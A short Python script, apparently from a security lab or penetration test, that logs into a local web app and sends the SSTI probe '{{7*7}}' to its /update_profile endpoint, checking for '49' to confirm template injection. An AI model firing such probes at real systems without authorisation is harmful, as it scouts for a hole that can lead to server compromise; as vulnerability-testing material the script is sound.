import requests
import sys

BASE_URL = "http://127.0.0.1:32812"

def login():
    """Login with retry logic for 500 errors"""
    url = f"{BASE_URL}/login"
    data = {'username': 'test', 'password': 'test'}
    
    for attempt in range(3):
        try:
            response = requests.post(url, data=data, allow_redirects=False)
            print(f"Login attempt {attempt + 1}: Status {response.status_code}")
            
            if response.status_code == 200:
                session = response.cookies.get('session')
                return response.status_code, session
            elif response.status_code == 500:
                continue
            else:
                return response.status_code, None
                
        except Exception as e:
            print(f"Login error: {e}")
            return 0, None
    
    return 500, None

def test_ssti(session_cookie):
    """Test SSTI on update_profile endpoint"""
    url = f"{BASE_URL}/update_profile"
    cookies = {'session': session_cookie}
    
    # SSTI payload
    files = {'name': (None, '{{7*7}}')}
    
    try:
        response = requests.post(url, cookies=cookies, files=files)
        return response.status_code, response.text
    except Exception as e:
        return 0, str(e)

# Execute tests
print("Testing SSTI vulnerability on /update_profile")
print("=" * 50)

login_status, session = login()
print(f"\nLogin Status: {login_status}")

if not session:
    print("Session Cookie: None")
    print("\n[ERROR] Failed to obtain session cookie")
    sys.exit(1)

print(f"Session Cookie: {session}")

update_status, update_body = test_ssti(session)
print(f"Update Profile Status: {update_status}")

# Check for SSTI result
if '49' in update_body:
    print("\n[SUCCESS] SSTI confirmed! Found '49' in response")
else:
    print("\n[SSTI Test Result] '49' NOT found")

print(f"\nFull Response:\n{update_body}")
